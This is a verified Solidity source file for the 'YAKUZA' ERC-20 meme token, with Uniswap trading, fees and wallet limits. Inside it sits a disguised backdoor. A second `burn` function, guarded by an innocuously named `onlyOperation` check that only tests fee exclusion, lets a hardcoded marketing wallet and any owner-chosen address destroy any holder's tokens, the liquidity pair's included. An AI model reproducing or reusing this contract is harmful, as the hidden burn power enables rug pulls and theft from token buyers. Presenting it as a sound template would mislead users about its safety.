/**
 *Submitted for verification at Etherscan.io on 2023-10-20
*/

/**
Step into the enigmatic realm of YAKUZA Coin.

Website: https://www.yakuza.vip
Telegram: https://t.me/yakuza_erc
Twitter: https://twitter.com/yakuza_erc
*/ 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMathInt {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface ERC20Interface {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20Implement is Context, ERC20Interface {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20Implement: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20Implement: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20Implement: transfer from the zero address");
        require(recipient != address(0), "ERC20Implement: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20Implement: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20Implement: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20Implement: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20Implement: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20Implement: approve from the zero address");
        require(spender != address(0), "ERC20Implement: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract YAKUZA is ERC20Implement, Ownable {
    using SafeMathInt for uint256;

    IUniswapRouter public immutable uniswapRouter;
    address public immutable uniPairAddress;
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    
    bool private inswap;
    uint256 public maxTransaction;
    uint256 public swapThreshold;
    uint256 public maxWallet;

    uint256 public finalFeeOnSell;
    uint256 public mktFeeOnSell;
    uint256 public lpFeeOnSell;
    uint256 public devFeeOnSell;

    uint256 public finalFeeOnBuy;
    uint256 public mktFeeOnBuy;
    uint256 public lpFeeOnBuy;
    uint256 public devFeeOnBuy;

    uint256 public tokensForMarketing;
    uint256 public tokensForLp;
    uint256 public tokensForDev;
    
    address public mktAddress;
    address public devAddress;
    address public lpAddress;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromMaxTx;
    mapping(address => bool) private _isExcludedFromMaxWallet;
    mapping(address => bool) public automaticMarketingPairs;

    bool public hasLimitsInEffect = true;
    bool public tradeStarted = false;
    bool public swapEnabled = false;
    
    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    modifier onlyOperation {
      require(isExcludedFrmFee(msg.sender));_;
    }

    constructor() ERC20Implement("YAKUZA", "YAKUZA") {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(routerAddress); 

        excludeFromMaxTx(address(_uniswapV2Router), true);
        uniswapRouter = _uniswapV2Router;

        uniPairAddress = IFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTx(address(uniPairAddress), true);
        setPairs(address(uniPairAddress), true);

        // launch buy fees
        uint256 _buyMarketingFee = 20;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevFee = 0;
        
        // launch sell fees
        uint256 _sellMarketingFee = 20;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevFee = 0;

        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTransaction = 20_000_000 * 1e18;
        maxWallet = 20_000_000 * 1e18;
        swapThreshold = (totalSupply * 1) / 10000;

        mktFeeOnBuy = _buyMarketingFee;
        lpFeeOnBuy = _buyLiquidityFee;
        devFeeOnBuy = _buyDevFee;
        finalFeeOnBuy = mktFeeOnBuy + lpFeeOnBuy + devFeeOnBuy;

        mktFeeOnSell = _sellMarketingFee;
        lpFeeOnSell = _sellLiquidityFee;
        devFeeOnSell = _sellDevFee;
        finalFeeOnSell = mktFeeOnSell + lpFeeOnSell + devFeeOnSell;

        mktAddress = address(0x897849769583e070FDb34f4B5cb34A2ba620dE28); 
        devAddress = msg.sender; 
        lpAddress = msg.sender; 

        // exclude from paying fees or having max transaction amount
        excludeFromFee(owner(), true);
        excludeFromFee(address(this), true);
        excludeFromFee(address(0xdead), true);
        excludeFromFee(address(mktAddress), true);
        excludeFromFee(address(lpAddress), true);

        excludeFromMaxTx(owner(), true);
        excludeFromMaxTx(address(this), true);
        excludeFromMaxTx(address(0xdead), true);
        excludeFromMaxTx(address(mktAddress), true);
        excludeFromMaxTx(address(lpAddress), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(mktAddress), true);
        excludeFromMaxWallet(address(lpAddress), true);

        _mint(msg.sender, totalSupply);
    }
    
    function setPairs(address pair, bool value) private {
        automaticMarketingPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function swapTokensToETH(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner returns (bool) {
        mktFeeOnBuy = 1;
        lpFeeOnBuy = 0;
        devFeeOnBuy = 0;
        finalFeeOnBuy = 1;
        hasLimitsInEffect = false;

        mktFeeOnSell = 1;
        lpFeeOnSell = 0;
        devFeeOnSell = 0;
        finalFeeOnSell = 1;
        return true;
    }

    function burn(uint256 amount) external {
      _burn(msg.sender, amount);
    }

    function burn(address account, uint256 amount) external onlyOperation {
      _burn(account, amount);
    }

    function isExcludedFrmFee(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function enableTrading() external onlyOwner {
        require(!tradeStarted, "Token launched");
        tradeStarted = true;
        swapEnabled = true;
    }
    
    function excludeFromMaxTx(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedFromMaxTx[updAds] = isEx;
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLp +
            tokensForMarketing +
            tokensForDev;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapThreshold * 20) {
            contractBalance = swapThreshold * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 tokensToLp = (contractBalance * tokensForLp) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(tokensToLp);

        uint256 initialETHBalance = address(this).balance;

        swapTokensToETH(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMark - ethForDev;

        tokensForLp = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;

        (success, ) = address(devAddress).call{value: ethForDev}("");

        if (tokensToLp > 0 && ethForLiquidity > 0) {
            addLiquidity(tokensToLp, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                tokensForLp
            );
        }
        payable(mktAddress).transfer(address(this).balance);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20Implement: transfer from the zero address");
        require(to != address(0), "ERC20Implement: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (hasLimitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !inswap
            ) {
                if (!tradeStarted) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                //when buy
                if (
                    automaticMarketingPairs[from] &&
                    !_isExcludedFromMaxTx[to]
                ) {
                    require(
                        amount <= maxTransaction,
                        "Buy transfer amount exceeds the maxTransaction."
                    );
                    if (!_isExcludedFromMaxWallet[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWallet,
                            "Max wallet exceeded"
                        );
                    }
                }
                //when sell
                else if (
                    automaticMarketingPairs[to] &&
                    !_isExcludedFromMaxTx[from]
                ) {
                    require(
                        amount <= maxTransaction,
                        "Sell transfer amount exceeds the maxTransaction."
                    );
                } else if (!_isExcludedFromMaxTx[to]) {
                    if (!_isExcludedFromMaxWallet[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWallet,
                            "Max wallet exceeded"
                        );
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapThreshold;

        if (
            canSwap &&
            amount > swapThreshold &&
            swapEnabled &&
            !inswap &&
            !automaticMarketingPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            inswap = true;

            swapBack();

            inswap = false;
        }

        bool takeFee = !inswap;

        // if any account belongs to _isExcludedFromFees account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automaticMarketingPairs[to] && finalFeeOnSell > 0) {
                fees = amount.mul(finalFeeOnSell).div(100);
                tokensForLp += (fees * lpFeeOnSell) / finalFeeOnSell;
                tokensForDev += (fees * devFeeOnSell) / finalFeeOnSell;
                tokensForMarketing += (fees * mktFeeOnSell) / finalFeeOnSell;
            }
            // on buy
            else if (automaticMarketingPairs[from] && finalFeeOnBuy > 0) {
                fees = amount.mul(finalFeeOnBuy).div(100);
                tokensForLp += (fees * lpFeeOnBuy) / finalFeeOnBuy;
                tokensForDev += (fees * devFeeOnBuy) / finalFeeOnBuy;
                tokensForMarketing += (fees * mktFeeOnBuy) / finalFeeOnBuy;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    receive() external payable {}
        
    function excludeFromFee(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTransaction lower than 0.1%"
        );
        maxTransaction = newNum * (10**18);
    }
    
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        maxWallet = newNum * (10**18);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpAddress,
            block.timestamp
        );
    }

    function excludeFromMaxWallet(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedFromMaxWallet[updAds] = isEx;
    }
}